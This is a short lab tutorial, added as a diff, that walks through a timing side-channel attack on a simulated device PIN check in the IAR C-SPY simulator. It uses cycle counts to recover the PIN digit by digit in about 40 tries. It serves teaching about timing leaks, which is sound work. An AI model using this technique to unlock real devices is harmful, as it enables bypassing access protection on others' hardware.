@@ -1,0 +1,33 @@
+tutorial1 timing leak exploit
+----------------------------
+
+The IAR simulator conveniently shows the total number of cycles when using senda.bat script.
+For example:
+> senda U0
+<      IAR C-SPY Command Line Utility V8.3.2.5988
+<     Copyright 2000-2019 IAR Systems AB.
+<
+<ready...
+<u0
+<ok
+<ERROR: Could not read from file handle 0
+<
+<
+<    CSpyBat terminating.
+<
+<total 3725 cycles
+>
+
+If you try other single digit value you will discover that value 2 takes more time to process than all other values.
+> senda U2
+< total 3738 cycles
+This means 2 is the correct value for first digit. Then you can try to discover the second digit in a similar manner. 
+> send U20 S
+< ...
+< device locked
+< ...
+< total 4108 cycles
+Once second digit is found, try the next one, until device is unlocked.
+Instead of having to try 10000 PIN codes (for a 4 digits PIN), you can unlock SD in at most 40 tries.
+
+
